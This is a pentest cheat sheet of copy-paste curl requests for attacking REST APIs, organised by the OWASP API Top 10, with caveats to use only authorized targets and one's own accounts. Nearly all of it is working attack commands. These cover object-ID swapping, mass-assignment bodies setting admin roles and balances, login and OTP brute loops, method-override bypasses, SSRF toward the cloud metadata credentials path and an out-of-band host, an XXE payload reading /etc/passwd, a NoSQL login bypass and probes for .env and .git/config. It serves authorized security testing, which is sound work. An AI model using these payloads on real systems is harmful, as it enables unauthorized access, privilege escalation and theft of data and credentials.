# REST API Arsenal — Copy-Paste Requests (OWASP API Top 10)

> Companion to `REST_API_TESTING_GUIDE.md`. Authorized APIs only. `$A`/`$B` = your two test-account tokens;
> `$ADM`/`$LOW` = admin/low-priv tokens. Replace `api.target.com`, IDs, and field names with the target's. Prove
> authorization bugs with **your own** accounts, read a **bounded** sample, never mass-exfiltrate.

Setup:
```bash
A='Authorization: Bearer <token_A>'      # account A (yours)
B='Authorization: Bearer <token_B>'      # account B (yours) — victim in your own tests
LOW='Authorization: Bearer <low_priv>'   # low-priv user
H='api.target.com'
```

---

## 1. Discovery / spec
```bash
for p in openapi.json openapi.yaml swagger.json v2/api-docs v3/api-docs api-docs swagger-ui.html \
         redoc docs api/docs swagger/v1/swagger.json .well-known/openapi postman; do
  printf "%-28s " "$p"; curl -s -o /dev/null -w "%{http_code} %{size_download}b\n" "https://$H/$p"
done
# import a found spec into Burp/Postman; then you have the whole API as a test matrix.

# method discovery on an endpoint:
curl -s -X OPTIONS "https://$H/api/v1/users/1" -i | grep -i '^allow:'
for m in GET POST PUT PATCH DELETE; do printf "%-7s " $m; curl -s -o /dev/null -w "%{http_code}\n" -X $m "https://$H/api/v1/users/1" -H "$A"; done

# route brute (Kali): kiterunner is API-route-aware
kr scan https://$H -w routes-large.kite -x 20
ffuf -u https://$H/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc all -fc 404
```

## 2. Auth model
```bash
# decode a JWT (no verify) — inspect claims/roles/exp
T=<jwt>; echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
# full JWT attacks (alg:none, weak secret, RS->HS, kid/jku): see ../../Web/JWT/
```

---

## 3. API1 — BOLA (swap the identifier as A → B's object)
```bash
# baseline: A reads A's object
curl -s "https://$H/api/v1/orders/1001" -H "$A" | jq .
# BOLA: A reads B's object (an ID only B should access) -> if you get B's data, it's BOLA
curl -s "https://$H/api/v1/orders/1002" -H "$A" | jq .

# ID in query / body / header:
curl -s "https://$H/api/v1/export?userId=<B_id>"        -H "$A"
curl -s "https://$H/api/v1/invoice" -H "$A" -H 'Content-Type: application/json' -d '{"orderId":<B_order>}'
curl -s "https://$H/api/v1/me/orders/<B_order>"          -H "$A"     # nested "me" but unscoped child
curl -s "https://$H/api/v1/data" -H "$A" -H 'X-Account-Id: <B_acct>'

# BOLA-write (higher impact): A modifies/deletes B's object
curl -s -X PUT    "https://$H/api/v1/orders/1002" -H "$A" -H 'Content-Type: application/json' -d '{"note":"x8-test"}'
curl -s -X DELETE "https://$H/api/v1/orders/1002" -H "$A"

# UUID BOLA: first LEAK B's id from a list/search endpoint, then use it
curl -s "https://$H/api/v1/search?q=a" -H "$A" | jq '..|.id? // empty' | head    # harvest other users' object ids
```
> Bounded: prove with **one** of B's objects. See `poc/authz_diff.py` to auto-replay A's traffic with B's token.

## 4. API2 — Broken Authentication
```bash
# no rate-limit on login/OTP (test on YOUR account; a few tries to show it's unthrottled)
for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code} " -X POST "https://$H/api/v1/login" \
  -H 'Content-Type: application/json' -d '{"email":"you@test.tld","password":"wrong'$i'"}'; done; echo
# OTP brute primitive (do NOT brute a stranger; show the endpoint accepts unlimited attempts on your own OTP)
for c in 000000 000001 000002; do curl -s -o /dev/null -w "%{http_code} " -X POST "https://$H/api/v1/otp/verify" \
  -H "$A" -H 'Content-Type: application/json' -d '{"code":"'$c'"}'; done; echo
# password reset abuse: user-controlled target (BOLA-in-reset) / host-header poisoning (see ../../Web/HostHeader/)
curl -s -X POST "https://$H/api/v1/reset" -H 'Content-Type: application/json' -d '{"email":"victim@test.tld","userId":<B_id>}'
```

## 5. API3 — Excessive Data Exposure (read the RAW json, diff vs UI)
```bash
curl -s "https://$H/api/v1/users/me" -H "$A" | jq 'keys'      # look for passwordHash, mfaSecret, isAdmin, ssn, internalNotes
curl -s "https://$H/api/v1/users?limit=5" -H "$A" | jq '.[0] | keys'   # list endpoints over-return per item
```

## 6. API3 — Mass Assignment (add hidden fields the UI never sends)
```bash
# take a legit update and inject privileged/hidden fields (try camelCase + snake_case + nested)
curl -s -X PATCH "https://$H/api/v1/users/me" -H "$A" -H 'Content-Type: application/json' -d '{
  "name":"x8","role":"admin","isAdmin":true,"is_staff":true,"isVerified":true,"emailVerified":true,
  "accountBalance":999999,"credits":100000,"planId":"enterprise","status":"approved",
  "permissions":["*"],"user":{"isAdmin":true},"role":{"name":"admin"}}'
# signup variant (set privilege at creation):
curl -s -X POST "https://$H/api/v1/register" -H 'Content-Type: application/json' -d '{"email":"m@test.tld","password":"Passw0rd!","role":"admin","isVerified":true}'
# order/price tamper:
curl -s -X POST "https://$H/api/v1/orders" -H "$A" -H 'Content-Type: application/json' -d '{"item":"X","qty":1,"price":0,"discount":100}'
# CONFIRM it stuck (not just echoed):
curl -s "https://$H/api/v1/users/me" -H "$A" | jq '{role,isAdmin,credits}'
```

## 7. API4 — Unrestricted Resource Consumption
```bash
curl -s "https://$H/api/v1/users?limit=1000000"                 -H "$A" -o /dev/null -w "%{size_download} bytes\n"
curl -s "https://$H/api/v1/report?include=a,b,c,d,e,f&expand=all" -H "$A" -o /dev/null -w "%{time_total}s\n"
# cost endpoints: one call that sends SMS/email or hits a paid upstream = $ per request (show, don't spam)
```

## 8. API5 — BFLA (privileged functions & verb tampering as LOW-priv)
```bash
# admin functions called by a normal user:
curl -s      "https://$H/api/v1/admin/users"                 -H "$LOW"
curl -s -X POST   "https://$H/api/v1/admin/users" -H "$LOW" -H 'Content-Type: application/json' -d '{"email":"m@test.tld","role":"admin"}'
curl -s -X DELETE "https://$H/api/v1/users/<other>"          -H "$LOW"
curl -s -X PUT    "https://$H/api/v1/users/me/roles" -H "$LOW" -H 'Content-Type: application/json' -d '{"roles":["admin"]}'
# verb tamper: UI does GET; try state-changing verbs as a normal user
for m in PUT PATCH DELETE POST; do printf "%-7s " $m; curl -s -o /dev/null -w "%{http_code}\n" -X $m "https://$H/api/v1/orders/1002" -H "$LOW"; done
# method override (bypass edge rule that blocks real DELETE/PUT):
curl -s -X POST "https://$H/api/v1/users/<other>" -H "$LOW" -H 'X-HTTP-Method-Override: DELETE'
curl -s -X POST "https://$H/api/v1/users/<other>?_method=DELETE" -H "$LOW"
# missing-auth entirely (no token):
curl -s "https://$H/api/v1/admin/config"
```

## 9. API6 — Business-flow abuse
```bash
# run a value flow many times fast (coupon / referral / limited stock) — a few iterations to show no anti-automation
for i in $(seq 1 10); do curl -s -X POST "https://$H/api/v1/coupon/redeem" -H "$A" \
  -H 'Content-Type: application/json' -d '{"code":"WELCOME10"}' -o /dev/null -w "%{http_code} "; done; echo
# limit-overrun via parallelism (race): see ../../Web/RaceCondition/ (single-packet / parallel_fire.py)
```

## 10. API7 — SSRF (URL/webhook/import params)
```bash
for p in url callback webhook image fetch dest redirect proxy target feed import src; do
  curl -s -o /dev/null -w "$p=%{http_code} " "https://$H/api/v1/fetch?$p=http://YOUR-OOB-HOST/$p" -H "$A"; done; echo
# cloud metadata / bypasses / gopher-RCE: full technique in ../../Web/SSRF/
curl -s "https://$H/api/v1/preview" -H "$A" -H 'Content-Type: application/json' -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

## 11. API8 — Misconfiguration
```bash
# CORS reflection with credentials (theft): see ../../Web/CORS/
curl -s -i "https://$H/api/v1/me" -H "$A" -H 'Origin: https://evil.tld' | grep -i 'access-control-allow-'
# Spring actuator / debug (secrets -> often RCE):
for p in actuator actuator/env actuator/health actuator/mappings actuator/heapdump metrics debug .env .git/config; do
  printf "%-22s " "$p"; curl -s -o /dev/null -w "%{http_code}\n" "https://$H/$p"; done
```

## 12. API9 — Improper Inventory (old/shadow versions)
```bash
# re-run a FIXED bug on old versions (v3 patched -> try v1/v2/beta/internal)
for v in v1 v2 v3 beta internal; do printf "%-8s " $v; curl -s -o /dev/null -w "%{http_code}\n" "https://$H/api/$v/users/1002" -H "$A"; done
# non-prod hosts: dev./staging./uat./test./sandbox. (subdomain enum -> ../../Web/Recon/)
```

## 13. API10 — Unsafe Consumption (data you feed the app's upstream trust)
```bash
# webhook/import the app INGESTS from a URL you control -> serve malicious/injected data, or redirect to internal
# (attacker-controlled upstream -> injection/SSRF/authz-bypass via trust). Design/red-team heavy.
```

## 14. REST-specific cross-cutting
```bash
# content-type confusion (JSON parsed despite declared type / XXE via xml):
curl -s -X POST "https://$H/api/v1/x" -H "$A" -H 'Content-Type: text/plain' -d '{"role":"admin"}'
curl -s -X POST "https://$H/api/v1/x" -H "$A" -H 'Content-Type: application/xml' --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>'   # XXE -> ../../Web/FileUpload/
# HTTP parameter pollution:
curl -s "https://$H/api/v1/orders?id=1001&id=1002" -H "$A"
curl -s -X POST "https://$H/api/v1/x" -H "$A" -H 'Content-Type: application/json' -d '{"role":"user","role":"admin"}'   # duplicate JSON key
# NoSQL operator injection (auth bypass / over-match): see ../../Web/SQLi/ NoSQLi note
curl -s -X POST "https://$H/api/v1/login" -H 'Content-Type: application/json' -d '{"email":"a@test.tld","password":{"$ne":null}}'
# injection into path/param -> SQLi/cmdi/SSTI/LFI/LDAP kits
```

## 15. Tooling cheat
```
Burp Autorize / AuthMatrix   replay A's requests with B's (or low-priv) token -> auto-flag BOLA/BFLA (non-403)
Postman + spec import        turn OpenAPI into a runnable, editable request set
kiterunner / ffuf            API-route & endpoint discovery
mitmproxy / Burp (mobile)    capture a mobile app's API to get the full endpoint set
jwt_tool / ../../Web/JWT/    token attacks
poc/ (this kit)              api_discover.py · authz_diff.py · massassign_fuzz.py · method_tamper.py
```
